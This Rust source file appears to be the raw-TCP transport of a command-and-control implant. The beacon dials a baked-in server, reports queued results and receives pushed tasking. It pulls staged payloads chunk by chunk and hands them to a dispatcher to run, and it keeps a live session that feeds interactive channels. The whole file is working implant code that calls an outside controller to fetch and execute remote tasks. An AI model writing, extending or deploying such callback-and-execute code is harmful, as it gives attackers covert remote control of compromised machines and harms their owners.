use std::io::{Read, Write};
use std::net::TcpStream;
use std::time::Duration;

use prost::Message;

use super::Contact;
use crate::error::ContactError;
use crate::profile::Profile;
use crate::session::{Attempt, Session};
use crate::wire::{Frame, FrameKind, StagedChunk, TaskRequest};

// The raw-TCP carriage (architecture.md Sec 8, the socket family): the same
// contact flow the envelope POST cycle runs, over a bare TCP connection
// speaking the self-delimited message shape -- a varint byte length, then
// that many body bytes, where the body is exactly what the envelope route
// carries (the sealed contact shape or the plaintext framed frames). The
// certificate-less posture: no TLS dial, the identity is the handshake id
// and the baked seal, and enrollment rides the socket's opening exchange.
//
// The bake's mode picks the client: a poll build opens one connection per
// cycle -- the request message carries the handshake and the batch, the
// response message carries the answer, staged answers, tasking, and the
// degraded channel input -- and closes; a stream build advertises the live
// capability and holds the connection, the server pushing tasking the
// moment it queues (the same session runner the WebSocket beacon runs).

/// The handshake capability that switches a socket connection from the poll
/// exchange to the held live session (the server's LiveSessionCapability).
pub const LIVE_SESSION_CAPABILITY: &str = "channels.live";

/// One message budget per direction, the envelope's own body cap (the wire
/// contract's sizing rule; nothing larger is legal on any carriage).
const MAX_MESSAGE_BYTES: usize = 8 * 1024 * 1024;

/// How long a message, once started, may take to complete: bounded against
/// a dead peer, generous against a slow one.
const MESSAGE_TIMEOUT: Duration = Duration::from_secs(30);

/// The channel tick while a live channel could have queued output -- the
/// same wake the WebSocket carriage rides, over the socket's read timeout.
const CHANNEL_TICK: Duration = Duration::from_millis(200);

pub struct RawTcp {
    address: String,
    live: bool,
}

impl RawTcp {
    pub fn new(profile: &Profile) -> RawTcp {
        let dial = super::dialed_beacon_url(profile);
        let rest = dial.strip_prefix("tcp://").unwrap_or(&dial);
        let address = rest.split('/').next().unwrap_or(rest).to_string();
        RawTcp {
            address,
            live: profile.mode == "stream",
        }
    }

    fn connect(&self) -> Result<TcpStream, ContactError> {
        let stream = TcpStream::connect(&self.address)
            .map_err(|e| ContactError::Transport(format!("dial {}: {e}", self.address)))?;
        stream.set_nodelay(true).ok();
        Ok(stream)
    }

    /// The poll shape: one connection is one contact. The request message
    /// carries the handshake plus the accumulated batch; the response
    /// message carries the handshake answer, the staged chunk runs
    /// answering this cycle's demands, queued tasking, and the degraded
    /// channel input. The batch leaves only after a processed response, so
    /// a failed contact re-sends it verbatim on the next connection.
    fn attempt_poll(&mut self, session: &mut Session) -> Result<Attempt, ContactError> {
        let mut stream = self.connect()?;
        session.drain_channels();
        let demands = session.outbox.take_demands();
        let batch = session.outbox.batch();
        let mut frames = Vec::with_capacity(1 + batch.len());
        frames.push(session.handshake_frame());
        frames.extend(batch.iter().cloned());
        let (body, _) = session.encode_outgoing(&frames);
        write_message(&mut stream, &body)?;

        let Some(response) = read_message(&mut stream, false)? else {
            return Err(ContactError::Protocol(
                "the socket closed before the answer",
            ));
        };
        let inbound = session
            .decode_incoming(&response)
            .ok_or(ContactError::Protocol(
                "the contact message did not verify under the baked key",
            ))?;
        let first = inbound.first().ok_or(ContactError::Protocol(
            "the contact response carried no frames",
        ))?;
        let (acks, attempt) = session
            .handshake_answered(first)
            .map_err(ContactError::Protocol)?;
        if let Attempt::Refused = attempt {
            return Ok(attempt);
        }
        session.outbox.batch_crossed(batch.len());
        super::http::accept_staged(session, &inbound, &demands);
        super::accept_tasking(session, &inbound[1..], acks);
        session.drain_channels();
        Ok(Attempt::Crossed)
    }

    /// The live shape: the handshake's live advertisement switches the
    /// connection into the held session -- the handshake answer rides as
    /// its own message, then the server pushes tasking the moment it
    /// queues, each frame its own message, until the connection dies and
    /// the run loop's reconnect cadence takes over.
    fn attempt_live(&mut self, session: &mut Session) -> Result<Attempt, ContactError> {
        let mut stream = self.connect()?;
        session.advertise(LIVE_SESSION_CAPABILITY);

        let handshake = [session.handshake_frame()];
        let (body, _) = session.encode_outgoing(&handshake);
        write_message(&mut stream, &body)?;
        let Some(inbound) = read_frames(session, &mut stream, false)? else {
            return Err(ContactError::Protocol(
                "the stream closed before the handshake response",
            ));
        };
        let first = inbound.first().ok_or(ContactError::Protocol(
            "the stream closed before the handshake response",
        ))?;
        let (acks, attempt) = session
            .handshake_answered(first)
            .map_err(ContactError::Protocol)?;
        if let Attempt::Refused = attempt {
            return Ok(attempt);
        }

        // Results whose delivery may have died with an earlier connection
        // ride this one first: the server records first-wins.
        flush(&mut stream, session)?;

        // The held loop: process each message's frames, then park on the
        // next message -- or, while a live channel could have queued
        // output, a short read-timeout tick that flushes it.
        let outcome = serve_after(session, &mut stream, &inbound[1..], acks);
        // A dead connection ends every channel it carried (the wire
        // contract's session-scoped lifetime); their results never come.
        session.channels.reap();
        outcome.map(|()| Attempt::Crossed)
    }
}

impl Contact for RawTcp {
    fn serves(&self, url: &str, _mode: &str) -> bool {
        url.starts_with("tcp://")
    }

    fn attempt(&mut self, session: &mut Session) -> Result<Attempt, ContactError> {
        if self.live {
            self.attempt_live(session)
        } else {
            self.attempt_poll(session)
        }
    }
}

/// One message's held frames: channel input routes to the live channel it
/// names, a staged task pulls its payload inline (the blocking exchange the
/// socket's request-response shape permits), tasking is accepted and
/// flushed the moment it happens.
fn serve_held(
    session: &mut Session,
    stream: &mut TcpStream,
    frames: &[Frame],
    acks: bool,
) -> Result<(), ContactError> {
    for frame in frames {
        if frame.kind() == FrameKind::ChannelInput {
            if let Ok(input) = crate::wire::ChannelInput::decode(frame.payload.as_ref()) {
                session.channels.feed(&input.task_id, input.data, input.eof);
            }
            continue;
        }
        if let Ok(task) = TaskRequest::decode(frame.payload.as_ref()) {
            if task.staged_bytes.is_some() {
                run_staged(session, stream, &task)?;
            } else {
                session.accept(&task, acks);
                flush(stream, session)?;
            }
        }
    }
    Ok(())
}

/// The held session's park: channel output is drained and flushed on every
/// wake, and the park itself blocks while no channel is live (nothing but
/// the server's push can wake us) or ticks while one is.
fn serve_loop(
    session: &mut Session,
    stream: &mut TcpStream,
    acks: bool,
) -> Result<(), ContactError> {
    loop {
        session.drain_channels();
        flush(stream, session)?;
        let _ = stream.set_read_timeout(if session.channels.any_live() {
            Some(CHANNEL_TICK)
        } else {
            None
        });
        if let Some(frames) = read_frames(session, stream, true)? {
            serve_held(session, stream, &frames, acks)?;
        }
    }
}

// Chained after the opening exchange: the held loop continues over the
// handshake message's remaining frames.
fn serve_after(
    session: &mut Session,
    stream: &mut TcpStream,
    frames: &[Frame],
    acks: bool,
) -> Result<(), ContactError> {
    serve_held(session, stream, frames, acks)?;
    serve_loop(session, stream, acks)
}

/// The staged arm on the held connection: demand the payload, then block on
/// the messages until its terminal chunk -- nothing else interleaves on a
/// blocking read.
fn run_staged(
    session: &mut Session,
    stream: &mut TcpStream,
    task: &TaskRequest,
) -> Result<(), ContactError> {
    let demand = [Frame {
        payload: crate::wire::StagedPull {
            task_id: task.task_id.clone(),
        }
        .encode_to_vec(),
        kind: FrameKind::StagedPull as i32,
    }];
    let (body, _) = session.encode_outgoing(&demand);
    write_message(stream, &body)?;

    let mut payload: Vec<u8> = Vec::new();
    loop {
        let Some(frames) = read_frames(session, stream, false)? else {
            return Err(ContactError::Protocol("the socket closed mid-payload"));
        };
        for frame in frames {
            if let Ok(chunk) = StagedChunk::decode(frame.payload.as_ref()) {
                if chunk.task_id == task.task_id {
                    payload.extend_from_slice(&chunk.data);
                    if chunk.terminal {
                        let (outcome, output) =
                            super::http::dispatch_staged(&task.verb, &task.arguments, &payload);
                        session.outbox.result(&task.task_id, outcome, &output);
                        return Ok(());
                    }
                }
            }
        }
    }
}

/// Writes whatever the session has queued since the last write, marking it
/// delivered: a message that left the socket counts as delivered.
fn flush(stream: &mut TcpStream, session: &mut Session) -> Result<(), ContactError> {
    let batch = session.outbox.batch();
    if batch.is_empty() {
        return Ok(());
    }
    let (body, _) = session.encode_outgoing(&batch);
    write_message(stream, &body)?;
    session.outbox.batch_crossed(batch.len());
    Ok(())
}

// --- The message codec (the socket family's StreamContactFraming): one
// self-delimited message per direction -- a varint byte length, then that
// many body bytes.

/// Writes one message: the varint length prefix, the body, and a flush so
/// the peer's read completes without waiting on buffer boundaries.
pub fn write_message(stream: &mut TcpStream, body: &[u8]) -> Result<(), ContactError> {
    let mut prefix = Vec::with_capacity(5);
    let mut value = body.len() as u64;
    while value >= 0x80 {
        prefix.push((value as u8) | 0x80);
        value >>= 7;
    }
    prefix.push(value as u8);
    stream
        .write_all(&prefix)
        .and_then(|()| stream.write_all(body))
        .and_then(|()| stream.flush())
        .map_err(|e| ContactError::Transport(e.to_string()))
}

/// Reads one message under a completion deadline. When `ticks` is set, an
/// idle read (nothing arrived) reports None instead of waiting -- the
/// channel wake; once a byte has arrived the message completes under the
/// bounded deadline, never mid-message desync.
pub fn read_message(stream: &mut TcpStream, ticks: bool) -> Result<Option<Vec<u8>>, ContactError> {
    stream
        .set_read_timeout(if ticks {
            Some(CHANNEL_TICK)
        } else {
            Some(MESSAGE_TIMEOUT)
        })
        .map_err(|e| ContactError::Transport(e.to_string()))?;
    let mut byte = [0u8; 1];
    match stream.read(&mut byte) {
        Ok(0) => {
            return Err(ContactError::Protocol(
                "the socket closed under the contact",
            ))
        }
        Ok(_) => {}
        Err(e) if is_read_tick(&e) => return Ok(None),
        Err(e) => return Err(ContactError::Transport(e.to_string())),
    }

    // A message has started: complete it under the bounded deadline.
    stream
        .set_read_timeout(Some(MESSAGE_TIMEOUT))
        .map_err(|e| ContactError::Transport(e.to_string()))?;
    let mut length = byte[0] as u64 & 0x7f;
    let mut shift = 7u32;
    while byte[0] & 0x80 != 0 {
        read_exact(stream, &mut byte)?;
        length |= ((byte[0] as u64) & 0x7f) << shift;
        if shift > 63 {
            return Err(ContactError::Protocol(
                "the message length prefix is a malformed varint",
            ));
        }
        shift += 7;
    }
    if length as usize > MAX_MESSAGE_BYTES {
        return Err(ContactError::Protocol(
            "the contact message exceeds the body budget",
        ));
    }
    let mut body = vec![0u8; length as usize];
    read_exact(stream, &mut body)?;
    Ok(Some(body))
}

/// Reads one message and decodes its body as this run's frames; None on an
/// idle tick (the `ticks` shape).
fn read_frames(
    session: &Session,
    stream: &mut TcpStream,
    ticks: bool,
) -> Result<Option<Vec<Frame>>, ContactError> {
    let Some(body) = read_message(stream, ticks)? else {
        return Ok(None);
    };
    session
        .decode_incoming(&body)
        .map(Some)
        .ok_or(ContactError::Protocol(
            "the contact message did not verify under the baked key",
        ))
}

fn read_exact(stream: &mut TcpStream, buffer: &mut [u8]) -> Result<(), ContactError> {
    stream
        .read_exact(buffer)
        .map_err(|e| ContactError::Transport(e.to_string()))
}

/// Whether a failed read is the read-timeout tick rather than a dead
/// socket.
fn is_read_tick(error: &std::io::Error) -> bool {
    matches!(
        error.kind(),
        std::io::ErrorKind::WouldBlock | std::io::ErrorKind::TimedOut
    )
}
